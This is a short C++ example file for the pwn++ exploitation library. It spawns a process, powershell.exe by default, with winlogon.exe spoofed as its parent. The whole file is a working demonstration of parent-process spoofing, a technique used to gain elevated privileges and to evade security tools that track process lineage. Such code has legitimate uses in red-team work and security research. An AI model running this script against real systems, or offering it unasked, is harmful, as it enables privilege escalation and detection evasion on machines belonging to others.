///
/// @file ProcessReparent
///
/// @author hugsy (hugsy@blah.cat)
///
/// @brief Simple script using pwn++ to script a process reparented
///

#include <pwn.hpp>

auto
wmain(const int argc, const wchar_t** argv) -> int
{
    pwn::globals.set("x64");
    pwn::globals.log_level = pwn::log::log_level_t::LOG_DEBUG;

    const auto target_process = (argc >= 2) ? std::wstring(argv[1]) : std::wstring(L"powershell.exe");
    const auto parent_process = (argc >= 3) ? std::wstring(argv[2]) : std::wstring(L"winlogon.exe");

    // Look for the parent process
    u32 ppid = 0;
    {
        auto res = pwn::win::system::pidof(parent_process);
        if ( !Success(res) )
        {
            err(L"failed to find PID of '{}'", parent_process);
            return EXIT_FAILURE;
        }

        ppid = Value(res).front();
        info(L"found winlogon pid={}", ppid);
    }

    // Create the new process using the parent PID
    {
        auto res = pwn::win::process::execv(target_process, ppid);
        if ( !Success(res) )
        {
            err(L"failed to spawn the process");
            return EXIT_FAILURE;
        }

        auto hProcess = pwn::utils::GenericHandle(std::get<0>(Value(res)));
        auto hThread  = pwn::utils::GenericHandle(std::get<1>(Value(res)));
        ::WaitForSingleObject(hProcess.get(), INFINITE);
    }

    return EXIT_SUCCESS;
}
